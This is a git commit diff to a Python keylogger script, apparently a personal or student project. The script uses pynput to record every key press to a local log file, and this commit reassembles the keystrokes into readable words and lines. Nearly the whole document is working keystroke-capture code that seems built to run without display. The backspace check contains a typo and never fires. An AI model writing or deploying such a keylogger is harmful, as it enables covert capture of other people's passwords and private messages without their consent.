a65dd0a482f9bdb29a3818474cb2ba844b9451c6
Reyogin <bertrand.ha@epita.fr>
2020-12-08 19:46:35 +0100

    [LOG] Appending strings to facilitate reading

--- keylog_no_display.py
+++ keylog_no_display.py
@@ -2,10 +2,27 @@ from pynput.keyboard import Key, Listener
 import logging
 
 log_file='/home/bertrand/Desktop/file_no_display.log'
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
+message = ""
 
 def on_press(key):
-    logging.info(str(key))
+    global message
+    if (hasattr(key, 'name')):
+        if key.name == 'space':
+            message += " "
+        elif key.name == 'enter':
+            #if key pressed is enter
+            logging.info(message)
+            message = ""
+        elif key.name == 'backspacet':
+            message = message[:-1]
+        else:
+            #TODO : handle ctrl and alt
+            logging.info(message)
+            logging.info(key.name)
+            message = ""
+    else:
+        message += key.char
 
 with Listener(on_press=on_press) as listener:
     listener.join()
